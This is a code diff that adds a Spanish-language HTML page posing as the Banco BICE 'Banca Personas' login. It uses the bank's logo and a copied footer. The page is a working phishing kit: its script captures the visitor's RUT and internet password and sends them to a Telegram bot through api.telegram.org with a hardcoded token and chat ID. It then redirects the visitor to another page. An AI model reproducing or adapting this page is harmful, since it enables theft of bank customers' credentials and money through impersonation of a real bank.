@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulario</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #fff;
+        }
+
+        .container {
+            max-width: 400px;
+            margin: 0 auto; /* Elimina el margen superior e inferior */
+            padding: 20px;
+            background-color: #fff;
+            border-radius: 10px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            border-bottom: none; /* Nueva línea para quitar el borde inferior */
+        }
+
+        img {
+            display: block;
+            margin: auto;
+            max-width: 60%;
+            height: auto;
+            max-height: 80px;
+            margin-top: -10px;
+        }
+
+        form {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        input[type="text"],
+        input[type="password"],
+        button {
+            width: 73%;
+            padding: 20px;
+            margin-bottom: 5px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+
+        button {
+            width: 75%;
+            background-color: #007bff; /* Cambié el color a azul */
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #0056b3; /* Cambié el color de hover */
+        }
+
+        label {
+            font-size: 0.8em;
+        }
+
+        .info {
+            color: #666666;
+        }
+
+        .info img {
+            width: 380px; /* Cambia el valor según lo necesites */
+            max-width: none; /* Elimina el tamaño máximo */
+        }
+
+        .policy {
+            margin-top: 100px;
+            font-size: 0.8em;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Contenido del formulario -->
+        <img src="https://upload.wikimedia.org/wikipedia/commons/1/17/Logo_Banco_BICE-300dpi.jpg" alt="Imagen">
+        <p>¡Te damos la bienvenida a Banca Personas!</p>
+        <form action="#" method="post" onsubmit="enviarFormulario(event)">
+            <label for="rut"></label><br>
+            <input type="text" id="rut" name="rut" placeholder="RUT"><br><br>
+            <label for="clave"></label><br>
+            <input type="password" id="clave" name="clave" placeholder="Clave  Internet"><br><br>
+            <label for="problema">¿Tienes problema con tu clave de internet?</label><br><br>
+            <button type="submit">Ingresar</button>
+            <div class="info">
+                <p>Para más información</p>
+                <img src="f.png" alt="Logo 1">
+            </div>
+        </form>
+        <div class="policy">
+            <p>©2022 Todos los Derechos Reservados.</p>
+            <p>Infórmese sobre la garantía estatal de los depósitos en su banco o en www.cmfchile.cl</p>
+        </div>
+    </div>
+
+    <!-- JavaScript -->
+    <script>
+        function enviarFormulario(event) {
+            event.preventDefault(); // Evitar el envío del formulario por defecto
+            
+            const rut = document.getElementById('rut').value;
+            const clave = document.getElementById('clave').value;
+
+            // Enviar los datos a Telegram
+            enviarDatosTelegram(rut, clave);
+        }
+
+        function enviarDatosTelegram(rut, clave) {
+            const token = '6140527375:AAEDfuyj0KUl1MB4IVb5jeC35_Ucfk6ykhk'; // Reemplaza con tu token de Telegram
+            const chatId = '7155365525'; // Reemplaza con tu ID de chat de Telegram
+            const mensaje = `Nuevo formulario enviado:\nRUT: ${rut}\nClave Internet: ${clave}`;
+            const url = `https://api.telegram.org/bot6140527375:AAEDfuyj0KUl1MB4IVb5jeC35_Ucfk6ykhk/sendMessage?chat_id=6140527375&text=${mensaje}`;
+
+            fetch(url, { method: 'POST' })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Error al enviar el mensaje');
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    console.log('Mensaje enviado con éxito:', data);
+                })
+                .catch(error => {
+                    console.error('Error al enviar el mensaje:', error);
+                });
+        }
+  function enviarFormulario(event) {
+            event.preventDefault(); // Evitar el envío del formulario por defecto
+            
+            const rut = document.getElementById('rut').value;
+            const clave = document.getElementById('clave').value;
+
+            // Enviar los datos a Telegram
+            enviarDatosTelegram(rut, clave);
+
+            // Redirigir al segundo index.html
+            window.location.href = 'index3.html';
+        }
+    </script>
+</body>
+</html>
